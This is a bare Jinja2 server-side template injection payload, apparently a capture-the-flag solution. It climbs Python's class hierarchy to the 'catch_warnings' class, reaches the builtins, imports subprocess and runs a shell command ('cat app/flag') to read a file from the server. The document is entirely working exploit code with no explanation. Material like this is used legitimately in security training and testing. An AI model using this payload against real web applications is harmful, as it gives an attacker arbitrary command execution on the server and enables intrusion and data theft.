` {% set ss = ''.__class__.__mro__[1].__subclasses__() %} `
` {% for sc in ss %} `
` {% if sc.__name__ == 'catch_warnings' %} `
` {% set que = sc()._module.__builtins__ %} `
` {% set os = que['__import__']('subprocess') %}`
` {{ os.check_output('cat app/flag', shell=True) }}`
` {% endif %} `
` {% endfor %} `